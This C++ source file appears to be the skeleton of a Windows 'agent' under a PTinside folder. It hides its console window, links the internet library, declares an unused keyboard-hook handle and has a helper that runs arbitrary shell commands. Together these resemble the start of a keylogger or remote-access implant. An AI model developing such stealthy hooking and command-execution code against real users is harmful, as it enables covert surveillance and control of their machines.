#include "pch.h"
#include<fstream>
#include <iostream>
#include <Windows.h>
#include<winuser.h>
#include <fstream>
#include <wininet.h>
#pragma comment( lib, "wininet" )
#include <ctime>
#include <chrono>
#include <thread>
#include <array>
#include <string>
#include <filesystem>
using namespace std;
string out = "";
string apppath = "C:\\Program Files\\PTinside\\";
HHOOK eHook = NULL;
string exec(const char* cmd) {
	array<char, 128> buffer;
	string result;
	unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}
void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
int main()
{
	hide();
	MSG Msg;
	cout << "Agent started..." << endl;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}